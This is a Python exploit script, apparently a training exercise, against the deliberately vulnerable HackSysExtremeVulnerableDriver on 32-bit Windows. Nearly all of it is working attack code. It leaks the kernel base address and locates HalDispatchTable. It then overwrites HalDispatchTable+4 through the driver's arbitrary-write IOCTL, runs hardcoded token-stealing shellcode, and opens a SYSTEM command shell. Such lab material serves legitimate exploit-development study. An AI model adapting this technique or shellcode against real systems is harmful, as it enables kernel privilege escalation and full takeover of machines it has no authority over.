import ctypes, sys, struct
from ctypes import *
from ctypes.wintypes import *
from subprocess import *
 
kernel32 = windll.kernel32
ntdll = windll.ntdll
'''
class SYSTEM_MODULE_INFORMATION(Structure):
    _fields_ = [("Reserved", c_void_p * 2),
                ("ImageBase", c_void_p),
                ("ImageSize", c_long),
                ("Flags", c_ulong),
                ("LoadOrderIndex", c_ushort),
                ("InitOrderIndex", c_ushort),
                ("LoadCount", c_ushort),
                ("ModuleNameOffset", c_ushort),
                ("ImageName", c_char * 256)]
'''
def base():
    print("[*] Calling NtQuerySystemInformation w/SystemModuleInformation class" )
    # https://github.com/GradiusX/HEVD-Python-Solutions/blob/master/Win10%20x64%20v1607/HEVD_arbitraryoverwrite.py
    # @GradiusX style, arbitrary buffer to get the system_information_length
    # then we'll call it a second time with the appropriately sized buffer
    system_information = create_string_buffer(0)
    system_information_length = c_ulong(0)
    ntdll.NtQuerySystemInformation(
        0xb,
        system_information,
        len(system_information),
        addressof(system_information_length)
    )
 
    # re-establishing this buffer now that we know the length we need
    system_information = create_string_buffer(system_information_length.value)
 
    # call it again, result should be equal to 0x00000000
    result = ntdll.NtQuerySystemInformation(
        0xb,
        system_information,
        len(system_information),
        addressof(system_information_length)
    )
 
    if result == 0x00000000:
        print("[*] Success, allocated {}-byte result buffer.".format(str(len(system_information))))
 
    # hardcoded results from FuzzySec's Get-SystemModuleInformation.ps1
    # key at: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55
    elif result == 0xC0000004:
        print("[!] NtQuerySystemInformation failed. NTSTATUS: STATUS_INFO_LENGTH_MISMATCH (0xC0000004)")
 
    elif result == 0xC0000005:
        print("[!] NtQuerySystemInformation failed. NTSTATUS: STATUS_ACCESS_VIOLATION (0xC0000005)")
 
    else:
        print("[!] NtQuerySystemInformation failed. NTSTATUS: {}").format(hex(result))
 
    # system_information is now a long array at this point with all of our module information
    # we need to parse it, let's first figure out how many handles we have like FuzzySec does
    # @GladiusX tells us that the first 4 bytes of our array, is the number of handles returned
    # create a unsigned long variable (4 bytes), move our first 4 bytes of our array into it, use .value property to get decimal value
    handle_num = c_ulong()
    memmove(addressof(handle_num), create_string_buffer(system_information[:4]), sizeof(handle_num))
    print("[*] Result buffer contains {} SystemModuleInformation objects".format(str(handle_num.value)))
 
    # take off the first four bytes
    system_information = create_string_buffer(system_information[4:])
 
    # iterate through the returned object looking for 'ntkrnl' in the ImageName space (i just hardcoded the offsets in the string buffer)
    # if you do var = SYSTEM_MODULE_INFORMATION() and then sizeof(var), you get 284 on x86
    # so our returned object/structure is 284 bytes long. first 4 bytes are 'Count'
    # good documentation here: https://gist.github.com/jNizM/ddf02494cd78e743eed776ce6164758f
    # when we find 'ntkrnl' we grab the ImageBase and return it
    # this is so bad lmao
    counter = 0
    for x in range(0,handle_num.value):
        image_name = system_information[counter + 28: counter + 284].strip("\x00")
        if "ntkrnl" in image_name:
            image_name = image_name.split("\\")[-1]
            print("[*] Kernel Type: {}".format(image_name))            
            base = c_ulong()
            memmove(addressof(base), create_string_buffer(system_information[counter + 8: counter + 12]), sizeof(base))
            kernel_base = hex(base.value)
            if kernel_base[-1] == "L":
                kernel_base = kernel_base[:-1]
                print("[*] Kernel Base: {}".format(kernel_base))
                return image_name, kernel_base
        counter += 284
 
 
def hal_calc(image_name, kernel_base):
 
    # grab a handle to ntkrnl
    kern_handle = kernel32.LoadLibraryA(image_name)
    if kern_handle == None:
        print("[!] LoadLibrary failed to retrieve handle to kernel with error: {}".format(str(GetLastError())))
        sys.exit(1)
    print("[*] Kernel Handle: {}".format(hex(kern_handle)))
 
    # use our handle to get the address of the HalDispatchTable in userland
    userland_hal = kernel32.GetProcAddress(kern_handle, "HalDispatchTable")
    if userland_hal == None:
        print("[!] GetProcAddress failed to retrieve HDT address with error: {}".format(str(GetLastError())))
        sys.exit(1)
    print("[*] Userland HalDispatchTable Address: {}".format(hex(userland_hal)))
 
    # using FuzzySec's powershell script as guide for math: $HalDispatchTable = $HALUserLand.ToInt32() - $KernelHanle + $KernelBase
    kernel_hal = userland_hal - kern_handle + int(kernel_base, 16)
    printable_hal = hex(kernel_hal)
    if printable_hal[-1] == "L":
        printable_hal = printable_hal[:-1]
    print("[*] Kernel HalDispatchTable Address: {}".format(printable_hal))
 
    # we want hal + 0x4, that's the function pointer we want to overwrite
    target_hal = kernel_hal + 0x4
    print("[*] Target HalDispatchTable Function Pointer at: {}".format(hex(target_hal)[:-1]))
 
    return target_hal
 
def exploit(target_hal):
 
    hevd = kernel32.CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        0xC0000000,
        0,
        None,
        0x3,
        0,
        None)
   
    if (not hevd) or (hevd == -1):
        print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
        sys.exit(1)
    else:
        print("[*] Successfully retrieved handle to device-driver: " + str(hevd))
 
    shellcode = bytearray(
        "\x60"
        "\x64\xA1\x24\x01\x00\x00"
        "\x8B\x40\x50"
        "\x89\xC1"
        "\x8B\x98\xF8\x00\x00\x00"
        "\xBA\x04\x00\x00\x00"
        "\x8B\x80\xB8\x00\x00\x00"
        "\x2D\xB8\x00\x00\x00"
        "\x39\x90\xB4\x00\x00\x00"
        "\x75\xED"
        "\x8B\x90\xF8\x00\x00\x00"
        "\x89\x91\xF8\x00\x00\x00"
        "\x61"
        "\xC3"
    )
 
    # create a buffer and fill it with shellcode, mark it RWX with VirtualProtect
    print("[*] Allocating shellcode character array...")
    usermode_addr = (c_char * len(shellcode)).from_buffer(shellcode)
    ptr = addressof(usermode_addr)
    print("[*] Allocated shellcode char array at: " + hex(ptr))
 
    print("[*] Marking shellcode RWX...")
   
    result = kernel32.VirtualProtect(
        usermode_addr,
        c_int(len(shellcode)),
        c_int(0x40),
        byref(c_ulong())
    )
 
    if result == 0:
        print("[!] VirtualProtect failed with error code: {}".format(str(GetLastError())))
 
    # create new buffer to hold pointer to shellcode
    print("[*] Allocating our What buffer...")
    new_buf_contents = bytearray(struct.pack("<L", ptr))
    new_buf = (c_char * len(new_buf_contents)).from_buffer(new_buf_contents)
    new_buf_ptr = addressof(new_buf)
    print("[*] Allocated What buffer at: " + hex(new_buf_ptr))
 
    print("[*] Marking What buffer RWX...")
    result = kernel32.VirtualProtect(
        new_buf,
        c_int(len(new_buf_contents)),
        c_int(0x40),
        byref(c_ulong())
    )
 
    if result == 0:
        print("[!] VirtualProtect failed with error code: {}".format(str(GetLastError())))
 
    buf = struct.pack("<L", new_buf_ptr)
    buf += struct.pack("<L", target_hal)
    buf_length = len(buf)
 
    result = kernel32.DeviceIoControl(
        hevd,
        0x22200b,
        buf,
        buf_length,
        None,
        0,
        byref(c_ulong()),
        None
    )
 
    if result != 0:
        print("[*] Buffer sent to driver successfully.")
    else:
        print("[!] Payload failed. Last error: " + str(GetLastError()))
 
    print("[*] Calling NtQueryIntervalProfile for trigger...")
    ntdll.NtQueryIntervalProfile(0x2408, byref(c_ulong()))
 
    print("[*] Opening system shell...")
    Popen("start cmd", shell=True)
   
 
image_name, kernel_base = base()
target_hal = hal_calc(image_name, kernel_base)
exploit(target_hal)
